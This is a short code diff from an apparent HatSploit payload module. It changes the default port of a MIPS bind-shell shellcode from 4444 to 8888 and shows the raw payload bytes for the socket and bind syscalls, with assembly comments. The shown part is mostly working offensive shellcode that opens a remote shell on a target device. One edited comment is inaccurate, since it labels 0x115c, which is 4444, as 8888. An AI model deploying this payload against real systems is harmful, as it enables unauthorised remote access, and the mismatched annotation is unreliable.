@@ -50,7 +50,7 @@ class HatSploitModule(HatSploitModule):
     options = {
         'BPORT': {
             'Description': "Bind port.",
-            'Value': 4444,
+            'Value': 8888,
             'Type': "port",
             'Required': True
         },
@@ -87,14 +87,14 @@ class HatSploitModule(HatSploitModule):
             b"\x24\x02\x10\x57" +        # li      v0,4183 ( __NR_socket )
             b"\x01\x01\x01\x0c" +        # syscall
 
-            # bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+            # bind(3, {sa_family=AF_INET, sin_port=htons(8888), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
             b"\x30\x50\xff\xff" +        # andi    s0,v0,0xffff
             b"\x24\x0e\xff\xef" +        # li      t6,-17                        ; t6: 0xffffffef
             b"\x01\xc0\x70\x27" +        # nor     t6,t6,zero                    ; t6: 0x10 (16)
             b"\x24\x0d\xff\xfd" +        # li      t5,-3                         ; t5: -3
             b"\x01\xa0\x68\x27" +        # nor     t5,t5,zero                    ; t5: 0x2
             b"\x01\xcd\x68\x04" +        # sllv    t5,t5,t6                      ; t5: 0x00020000
-            b"\x24\x0e" + bind_port +    # li      t6,0xFFFF (port)   ; t6: 0x115c (4444 (default LPORT))
+            b"\x24\x0e" + bind_port +    # li      t6,0xFFFF (port)   ; t6: 0x115c (8888 (default LPORT))
             b"\x01\xae\x68\x25" +        # or      t5,t5,t6                      ; t5: 0x0002115c
             b"\xaf\xad\xff\xe0" +        # sw      t5,-32(sp)
             b"\xaf\xa0\xff\xe4" +        # sw      zero,-28(sp)
